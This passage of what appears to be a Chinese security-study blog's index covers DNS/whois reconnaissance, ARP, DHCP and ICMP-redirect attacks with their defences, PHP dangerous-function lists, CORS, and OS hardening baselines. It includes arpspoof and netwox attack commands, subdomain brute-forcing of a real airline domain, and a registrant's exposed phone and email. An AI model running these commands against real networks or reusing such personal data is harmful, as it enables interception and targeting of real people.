当你输入一个网址并按下回车键的时候，首先，应用层协议对该请求包做了格式定义；紧接着传输层协议加上了双方的端口号，确认了双方通信的应用程序；然后网络协议加上了双方的IP地址，确认了双方的网络位置；最后链路层协议加上了双方的MAC地址，确认了双方的物理位置，同时将数据进行分组，形成数据帧，采用广播方式，通过传输介质发送给对方主机。而对于不同网段，该数据包首先会转发给网关路由器，经过多次转发后，最终被发送到目标主机。目标机接收到数据包后，采用对应的协议，对帧数据进行组装，然后再通过一层一层的协议进行解析，最终被应用层的协议解析并交给服务器处理。]]></content>
      <categories>
        <category>网络及协议</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[信息收集--DNS、IP]]></title>
    <url>%2F2018%2F12%2F23%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E3%80%81IP%2F</url>
    <content type="text"><![CDATA[域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 当个人或者企业实体注册域名时需要注册许多信息，注册隐私的设置各种各样，我们可以搜集这些信息并用来验证IP空间。根据这个线索，可以寻找属于该个人或者企业实体的其他网站信息，甚至于核心员工的号码和地址。 与DNS相关的命令使用 Host（host domain，host-vdomain） nslookup dig whois whois域名查询使用whois命令对域名进行查询。 例如： whois ceair.com 从中信息中发现一个新域名：ce-air.com 继续用whois进行查询 得到Registrant Name:chenchang Registrant Organization:china easter, airlines Registrant Street:No 2550 Rd hongqiao Registrant City:shixiaqu Registrant State/Province:shanghaishi Registrant Postal Code:200335 Registrant Country:CN Registrant Phone:+86.13818632527 Registrant Phone Ext: Registrant Fax:+86.13818632527 Registrant Fax Ext: Registrant Email:cchen@ceair.com 其中有比较重要的邮箱、电话号码、姓名。 然后在http://whois.chinaz.com/中提供的几个反查工具中进一步查询。 又发现一个新域名 eaglevision-china.com 这样就可以获得很多有用信息。 nslookupnslook set type=A www.ceair.com digdig ceair.com 查询NS记录： dig ceair.com NS 查询TXT记录： dig +noall +answer ceair.com TXT DNS子域名爆破工具https://github.com/lijiejie/subDomainsBrute python .\subDomainsBrute.py --full -t 10 ceair.com 通过子域名的爆破，可以进一步明确企业网络资产（有哪些域名、域名对应什么系统、域名集中的C段地址等等），这是攻击者、防御者都需要时刻关注的方面。 利用多地Ping工具，查看域名真实IP一些站点为了能够让用户获得更好的体验与提高安全性，会采用CDN技术对网站进行加速，因此在使用nslookup等工具进行本地查询时，可能无法获取到网站的真实IP地址。 这种情况下，通常采用多个地点对网站进行访问，查看解析结果的方式来确定是否使用CDN。 在浏览器中输入http://ping.chinaz.com/ceair.com 可以片中看出，该归属地、运营商、ASN数据等信息。 针对部分IP进行信息收集通过上述两个步骤，可以将确定的集中在某一C段IP进行查询，确定是否属于该企业。 选取子域名爆破结果中多次出现的一个IP（C段）： whois 218.1.115.23]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网络及协议安全]]></title>
    <url>%2F2018%2F12%2F23%2F%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[协议在网络中进行数据通信，在什么情况下发送什么样的数据，要有一定的规则，这些规则或者约定就是协议，也叫网络协议。 协议的组成 同步：实现顺序的详细说明 语法：发送数据或者控制信息的格式 语义：根据控制信息，做出的响应 ARP协议攻击和防御ARP协议漏洞ARP协议是建立在信任局域网内所有节点的基础上的，他的效率很高。但是不安全。它是无状态的协议。他不会检查自己是否发过请求包，也不知道自己是否发过请求包。他也不管是否合法的应答，只要收到目标mac地址是自己的ARP reply或者ARP广播包（包括ARP reply和ARP request），都会接受并缓存。 ARP攻击原理ARP欺骗攻击建立在局域网主机间相互信任的基础上的 当A发广播询问：我想知道IP是192.168.0.3的硬件地址是多少？ 此时B当然会回话：我是IP192.168.0.3我的硬件地址是mac-b， 可是此时IP地址是192.168.0.4的C也非法回了：我是IP192.168.0.3,我的硬件地址是mac-c。而且是大量的。 所以A就会误信192.168.0.3的硬件地址是mac-c，而且动态更新缓存表 这样主机C就劫持了主机A发送给主机B的数据，这就是ARP欺骗的过程。 假如C直接冒充网关，此时主机C会不停的发送ARP欺骗广播，大声说：我的ＩＰ是１９２.１６８.０.１，我的硬件地址是ｍａｃ－ｃ， 此时局域网内所有主机都被欺骗，更改自己的缓存表，此时Ｃ将会监听到整个局域网发送给互联网的数据报。 ARP欺骗攻击的方式 cain arpspoof【arpspoof -i eth0 -t 目标IP 网关IP # ARP欺骗】 ettercap ARP攻击的症状 打开网页很慢，甚至打不开 提示IP地址冲突 键入arp -a查看缓存表，如果发现网关的MAC地址发生了改变，或者发现有很多IP指向同一个物理地址 ARP攻击的检测 通过命令查看主机的ARP表或路由器的ARP表 用wireshark抓包查看可以&lt;IP,MAC&gt;地址映射 ARP防火墙安全日志 ARP攻击的防御 设置静态ARP缓存表 专用VLan 交换机端绑定 安装ARP防火墙 通过”arp -d“清除arp列表，重新访问（临时方法） 将DHCP服务器建立在网关上（ARP攻击一般先攻击网关） 实在不行使用代理 找出ARP病毒主机下载NBTSCAN，他可以扫描到PC的真实IP地址和MAC地址。 DHCP协议攻击和防御DHCP的工作流程 ①首先由客户端以广播方式发出“DHCP Discover”报文来寻找网络中的DHCP服务端。 ②当服务端接收到来自客户端的“DHCP Discover”报文后，就在自己的地址池中查找是否有可提供的IP地址。如果有，服务端就将此IP地址做上标记，并用“DHCP Offer”报文将之发送回客户端。 ③由于网络中可能会存在多台DHCP服务端，所以客户端可能会接收到多个“DHCP Offer”报文。此时客户端只选择最先到达的“DHCP Offer”，并再次以广播方式发送“DHCP Request”报文。一方面要告知它所选择的服务端，同时也要告知其它没有被选择的服务端，这样这些服务端就可以将之前所提供的IP地址收回。 ④被选择的服务端接收到客户端发来的“DHCP Request”报文后，首先将刚才所提供的IP地址标记为已租用，然后向客户端发送一个“DHCP Ack”确认报文，该报文中包含有IP地址的有效租约以及默认网关和DNS服务器等网络配置信息。 当客户端收到“DHCP ACK”报文后，就成功获得了IP地址，完成了初始化过程。 DHCP服务欺骗和报文泛洪攻击利用yersinia耗尽IP资源 sending RAW packet sending DISCOVER packet creating DHCP sending RELEASE packet 防护措施 DHCP Snooping功能只能防止假冒攻击，而无法防止耗尽攻击。这是由于耗尽攻击所采用的都是客户端正常发送的DHCP Discover报文，因而DHCP Snooping对其无能为力。 可以通过交换机的Port-Security(端口安全性)功能来防范耗尽攻击。因为Yersinia伪造的每个DHCPDiscover报文的源MAC地址都是不同的，在交换机中执行showmac-address-table命令查看MAC地址表，就会发现在攻击机所连接的端口上产生了大量的MAC地址表条目，我们可以限定每个端口的最大MAC地址数量。 DHCP VACL 启用ARP入侵检测功能 使用IP过滤功能 DHCP报文限速。 MAC泛洪攻击概念交换机中存在着一张记录着MAC地址的表，为了完成数据的快速转发，该表具有自动学习机制；泛洪攻击即是攻击者利用这种学习机制不断发送不同的MAC地址给交换机，充满整个MAC表，此时交换机只能进行数据广播，攻击者凭此获得信息。 攻击原理 伪造大量的未知MAC地址进行通信 MAC表就会被充满 正常主机的MAC地址老化之后，无法再添加到MAC表 攻击工具进行MAC泛洪攻击的工具——macof： 使交换机的MAC表溢出 对于以后收到的数据包以广播方式发送 泛洪之前就存在与交换机MAC表中的条目不会被覆盖，只能等到这些条目自然老化 防御措施 限制相应端口通信MAC地址数目 设置端口关闭定时器 IP源地址欺骗简介IP 欺骗技术就是伪造某台主机的IP地址的技术。通过IP 地址的伪装使得某台主机能够伪装另外的一台主机，而这台主机往往具有某种特权或者被另外的主机所信任。假设现在有一个合法用户(1.1.1.1)已经同服务器建立正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP 为1.1.1.1，并向服务器发送一个带有RSI位的TCP数据段。服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中建立好的连接。这时，如果合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就必须从新开始建立连接。攻击时，伪造大量的IP地址，向目标发送RST数据，使服务器不对合法用户服务。虽然IP地址欺骗攻击有着相当难度，但我们应该清醒地意识到，这种攻击非常广泛，入侵往往从这种攻击开始。 隐藏发送者身份 假冒其他计算机 IP欺骗原理只使用数据包中的目标地址进行路由转发，不对源地址进行真实性的验证。 IP地址被用来在网络和计算机之间发送及接收信息，因此，每个信息包里都包含了IP地址，这样双方才能发送到正确的对方，对方也才能知道来源是正确的。 当IP欺骗被使用的时候，包里面的就不再是真实的IP，取而代之的是伪造的IP地址，这样，看上去包就是由那个IP发出的，如果对方回复这个信息，那么数据将会被发送到伪造的IP上，除非黑客重定向该信息到一个真实的IP上。 为什么要IP欺骗IP欺骗被用来从事非法活动，破坏网络安全，黑客使用IP欺骗就不会被抓到，还有一些黑客进行Dos攻击的时候，就可以隐藏真实的IP，这样攻击者就无法查到。IP欺骗有时候也可以用来被克隆某个内部网中的信息，这样有时候就可以避免开户名和密码验证而直接登录系统。 IP源地址欺骗技术的应用 拒绝服务攻击 网络扫描【nmap -D用一组肉机IP地址掩盖真实地址、Spoofer、Yersina 】 IP源地址欺骗防御 使用随机化的初始序列号 抛弃基于地址的信任策略：阻止IP欺骗攻击的一种容易的办法就是放弃以地址为基础的验证。不允许r类远程调用命令的使用;删除.rhosts文件;清空/etc/hosts.equiv文件。这将迫使所有用户使用其他远程通信手段，如Telnet、ssh、skey等等。 使用加密方法：在包发送到网络之前，我们可以对它进行加密。虽然加密过程要求适当改变目前的网络环境，但它将保证数据的完整性和真实性。【IPsec】 进行包过滤：可以配置路由器使其能够拒绝网络外部和本网内具有相同IP地址的连接请求。而且，当包的IP地址不在本网内，路由器不应该把本网主 机的包发送出去。 在路由转发表中查找对应的转发接口是否与入接口匹配（检查数据包的源） ICMP重定向攻击ICMP重定向 如上图，当主机A向主机B发送一个请求时，先通过默认网关（路由R2）发起请求（蓝色虚线），而这时R2发现通过自己到达主机B并非最佳路径，通过路由R1到达主机B的路径更短，于是这时路由R2就会向主机A发送ICMP重定向报文，让主机A下次请求主机B时通过路由R1走，不要从路由R2走。这时主机A就会在自己的路由表中将到达主机B的下一跳地址改成路由R1。 攻击思路正常的网关可以向主机发送重定向报文，那么我们只要伪造网关发送重定向报文，就能使得被攻击者在下次发起请求时将数据包发送至错误的网关。这样可以使被攻击者断网或者窃听其流量数据。 攻击的关键点是要抓取到主机A向路由R1发送的数据包，在wlan下数据报都是广播发送，所以攻击者的网卡只需要开启混杂模式，就能抓取到主机A向路由R1发送的包。 攻击流程冒充网关IP地址，向被攻击节点发送ICMP重定向报文（将指定的新路由器IP地址设置为攻击节点。） 被攻击节点接受到该报文后会进行限制条件检查。（选择攻击节点作为新路由器） 攻击节点可以开启路由转发充当中间人（全程嗅探监听） 攻击实践利用Netwox的第86号工具 netwox 86 -f -&quot;host 192.168.1.105&quot; -g 192.168.1.100 -i 192.168.1.1 防范网关端： 关闭ICMP重定向 变长子网掩码划分网段 使用网络控制列表ACL和代理 主机端： 可以使用防火墙等过滤掉ICMP报文或使用反间谍软件监控。 结合防ARP、IP欺骗等进行防御]]></content>
      <categories>
        <category>网络及协议</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计]]></title>
    <url>%2F2018%2F12%2F20%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[php代码执行 eval() assert() preg_replace + ‘/e’ call_user_func() call_user_func_array() create_function array_map() 系统命令执行 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号) ob_start() escapeshellcmd() // 该函数用于过滤 文件上传 move_uploaded_file() getimagesize() //验证文件头只要为GIF89a，就会返回真 文件删除 unlink() session_destroy() 文件包含本地文件包含 require() include() include_once() require_once() 远程文件包含 allow_url_include = on 文件读取 hightlight_file($filename); show_source($filename); print_r(php_strip_whitespace($filename)); print_r(file_get_contents($filename)); readfile($filename); print_r(file($filename)); // var_dump fread(fopen(size); include($filename); // 非php代码 include_once($filename); // 非php代码 require($filename); // 非php代码 require_once($filename); // 非php代码 print_r(fread(popen(“cat flag”, “r”), $size)); print_r(fgets(fopen($filename, “r”))); // 读取一行 fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF print_r(fgetcsv(fopen(size)); print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记 print_r(fscanf(fopen(“flag”, “r”),”%s”)); print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组 列目录 print_r(glob(“*”)); // 列当前目录 print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”)); print_r(scandir(“/“)); $d=opendir(“.”);while(false!==($f=readdir($d))){echo”$f\n”;} $d=dir(“.”);while(false!==($f=$d-&gt;read())){echo$f.”\n”;} 超全局变量 $GLOBALS 变量覆盖 extract() import_request_variables() parse_str() mb_parse_str() 全局变量覆盖：register_globals为ON，$GLOBALS php序列化函数 serialize() unserialize() ini_set(‘session.serialize_handler’, ‘php_serialize’);]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[跨域资源共享CORS详解]]></title>
    <url>%2F2018%2F12%2F18%2F%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。 它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 简介CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。 整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。 两种请求浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。 （1) 请求方法是以下三种方法之一： HEAD GET POST （2）HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 凡是不同时满足上面两个条件，就属于非简单请求。 浏览器对这两种请求的处理，是不一样的。 简单请求基本流程对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。 下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。 （1）Access-Control-Allow-Origin该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 （2）Access-Control-Allow-Credentials该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 （3）Access-Control-Expose-Headers该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值。 withCredentials 属性上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。 Access-Control-Allow-Credentials: true 另一方面，开发者必须在AJAX请求中打开withCredentials属性。 var xhr = new XMLHttpRequest(); xhr.withCredentials = true; 否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。 但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显示关闭withCredentials。 xhr.withCredentials = false; 需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 非简单请求非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。 下面是一段浏览器的JavaScript脚本。 var url = &apos;http://api.alice.com/cors&apos;; var xhr = new XMLHttpRequest(); xhr.open(&apos;PUT&apos;, url, true); xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;); xhr.send(); 上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。 浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。 OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，”预检”请求的头信息包括两个特殊字段。 （1）Access-Control-Request-Method该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 （2）Access-Control-Request-Headers该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 预检请求的回应服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain 上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他CORS相关字段如下。 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。 （2）Access-Control-Allow-Headers如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。 （3）Access-Control-Allow-Credentials该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 浏览器的正常请求和回应一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 下面是”预检”请求之后，浏览器的正常CORS请求。 PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面头信息的Origin字段是浏览器自动添加的。 下面是服务器正常的回应。 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。 与JSONP的比较CORS与JSONP的使用目的相同，但是比JSONP更强大。 JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。]]></content>
      <categories>
        <category>SSRF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux系统配置安全]]></title>
    <url>%2F2018%2F12%2F18%2FLinux%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[Linux系统安全基线检测操作系统是否安装最新补丁 操作系统长时间不更新易导致系统上存在较多的高中危漏洞。 检查操作系统是否修改banner 默认banner本地或远程登陆时候会显示当前操作系统的版本、内核版本等信息，造成系统信息泄露。 检查操作系统是否存在与系统无关账户 UID为0的账户拥有超级管理员权限，系统除root用户外不应存在其他UID为0的用户。操作系统存在多个与系统无关的用户，易导致账户信息泄露等问题。 Linux系统安全基线检查操作系统是否存在空口令和脆弱性口令账户 空口令账户不需要密码即可登录或容易被攻击者猜到，存在系统非授权访问的威胁。 检查操作系统是否配置口令策略和口令复杂度 未设置合理的密码策略可能导致用户使用弱口令。 检查操作系统是否配置登录失败处理功能 未设置合理的账户锁定策略易导致系统密码被暴力破解等问题。 检查操作系统是否开启了不必要的服务 根据最小化安装原则，系统应关闭不必要的服务，这些服务可以被恶意用户利用，曹诚阻断连接和利用特殊账号破坏系统等影响。 检查操作系统是否开启了Telnet协议远程登录 Telnet采用明文传输协议，才传输过程中易被截取或篡改。 检查操作系统是否限制root用户远程登录 未限制超级管理员用户远程登录易导致在非授权人员获得超级管理员口令是可远程登录操作系统。 检查操作系统是否显示su命令使用策略 未设置su命令的使用策略可能导致普通用户在得到root用户密码后可以切换到root用户。 检查操作系统是否限制可登录服务器的IP地址 进行终端访问地址的限定使得网络内其他用户也可以访问不该访问的服务器。 检查操作系统是否配置超时锁定时间 没有设置超时锁定时间可能在管理员忘记锁定机器的情况下被非法攻击。 检查操作系统是否合理设置重要配置文件权限 不合理的权限易导致系统重要配置文件被非授权访问或篡改。 检查操作系统是否控制用户缺省访问权限 umask的默认设置一般为022，这给新创建的文件默认权限755（777-022=755），这会给文件所有者读、写权限，但只给组成员和其他用户读权限。 检查操作系统是否开启审计功能，并配置审计策略 不完善的审计记录会导致对于系统操作事件记录不完全，当系统安全事件发生时，无法及时追踪到具体操作。 检查操作系统是否开启日志功能，并配置日志策略 不完善的日志功能不利于系统安全问题的追踪。 检查操作系统是否设置审计文件和日志文件权限 易导致用户入侵操作记录被清理。 检查操作系统是否限制单个用户使用资源限度 不对单个用户使用资源进行限制可能导致单个用户操作（例如执行死循环）耗尽资源。 提权漏洞合集Linux https://github.com/SecWiki/linux-kernel-exploits Windows https://github.com/SecWiki/windows-kernel-exploits Exploits Dtatbase https://www.exploit-db.com/]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows系统配置安全]]></title>
    <url>%2F2018%2F12%2F18%2FWindows%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[操作系统安全基线服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。 主要作用： 设置口令复杂度策略，防止暴力破解密码。 控制用户或文件权限，减少被攻击后的影响。 最小化安装操作系统，防止不必要的服务带来的安全问题。 基线范围 操作系统 网络设备 数据库 中间件 Windows系统配置安全账户管理多用户系统 Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户和用户组，如管理员用户、Web用户、数据库用户等。 定期检查用户，删除无用、过期的账户 应保证所有用户均为有效且在用。 禁用Guest用户 系统应禁用Guest账户，Guest账户默认不开启。 更改默认管理员账户名称 应更改默认的管理员名称administrator，防止暴力破解等问题。 不显示最后的用户名 用户登出后，下次登陆时，不应显示登录名称 检测方法 控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理 控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略 密码策略密码复杂度 应启用密码策略，根据规范设置密码长度、复杂度等选项。 更换密码周期 应定期更改静态口令，建议不超过90天。 用户锁定策略 应配置账户锁定策略，防止暴力破解攻击。 检测方法 控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;用户策略 权限管理远程关机 应只有管理员用户可以远程关闭操作系统。 本地关机 只有管理员用户可以本地关闭操作系统。 用户权限指派 取得文件或其他对象的所有权限应只分配给administrators组 授权用户登录 配置指定授权用户允许本地登陆此计算机。 授权账户从网络访问 只允许授权账号从网络访问（包括网络共享等，但不包括终端服务）此计算机。 禁用未登录前关机 如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客可乘之机，所以建议禁用未登录前关机功能 检测方法 控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略 日志审计设置日志文件大小 设置应用日志文件大小至少为8192KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。 设置当达到最大的日志尺寸时，按需要轮询记录日志。 检测方法 控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略-&gt;审核策略 控制面板-&gt;系统和安全-&gt;管理工具-&gt;事件查看器-&gt;windows日志，查看应用日志、系统日志、安全日志属性中的日志大小，并根据安全策略设置达到日志最大大小时的操作。 文件权限关闭默认共享 非域环境中，关闭Windows硬盘默认共享，例如C$,D$ 设置共享文件夹权限 每个共享文件夹的共享权限，只允许授权的账户拥有共享此文件夹的权限。 检测方法 打开cmd，输入net share查看当前共享 控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;共享文件夹，查看每个共享文件夹权限。 最小化安装根据业务需求，禁用不必要的服务，删除不必要的文件 其他设置 应安装防病毒软件，确保病毒库及时更新。 设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。 对于远程登录的账户，设置不活动超过时间15分钟地洞断开连接。 关闭自动播放功能，防止自动运行恶意程序。 无特殊需求应该关闭远程桌面。 无特殊需求应该关闭远程协助。 开启windows防火墙，对进出站规则进行限制。 检测脚本编写检测用户相关net user //查看系统用户 net user college //查看具体用户信息 net localgroup //查看用户组 net localgroup Administrators //查看Administrators用户组 net localgroup Guests //查看Guests用户组 本地策略secedit /export /cfg C:\temp.txt 导出本地安全策略到c:\temp.txt中 密码复杂度、更改密码周期(0表示禁用，1表示启用) PasswordComplexity //密码必须符合复杂性要求 MinimumPasswordLength //密码长度最小值 MinimumPasswordAge //密码最短使用期限 MaximumPasswordAge //密码最长使用期限 PasswordHistorySize //强制密码历史 账户锁定策略(无结果表示未开启） LockoutDuration //账户锁定时间 LockoutBadCount //账户锁定阈值 审核策略(0表示无审核，1表示成功审核，2表示失败审核，3表示成功和失败审核) AuditAccountManage //审核帐户管理 AuditAccountLogon //审核帐户登录事件 AuditSystemEvents //审核系统事件 AuditDSAccess //审核目录服务访问 AuditProcessTracking //审核过程跟踪 AuditPrivilegeUse //审核特权使用 AuditObjectAccess //审核对象访问 AuditLogonEvents //审核登录事件 AuditPolicyChange //审核策略更改 安全选项（0表示已停用，1表示已启用） AutoDisconnect //在挂起会话之前所需的空闲时间 DontDisplayLastUserName //不显示上次登录的用户名 ClearPageFileAtShutdown //关机前清理虚拟内存页面 ShutdownWithoutLogon //允许在未登录前关机 用户权利分配（Everyone:S-1-1-0 Administrators:S-1-5-32-544 Users:S-1-5-32-545 Power Users:S-1-5-32-547 Backup Operators:*S-1-5-32-551） SeRemoteShutdownPrivilege //从远程系统强制关机 SeTakeOwnershipPrivilege //取得文件或其他对象所有权 SeInteractiveLogonRight //从本地登录此计算机 SeRemoteInteractiveLogonRight //允许通过远程桌面服务登录 SeDebugPrivilege //调试程序 SeSystemtimePrivilege //更改系统时间 SeSecurityPrivilege //管理审核和安全日志 最后删除C盘中的临时文件 del C:\temp.txt 注册表信息是否开启屏保（0关，1开） reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive |find &quot;ScreenSaveActive&quot; 屏保时间（单位秒） reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut |find &quot;ScreenSaveTimeOut&quot; 屏保恢复时使用密码保护（0否，1是） reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaverIsSecure |find &quot;ScreenSaverIsSecure&quot; 防火墙状态（1开，0关） reg query 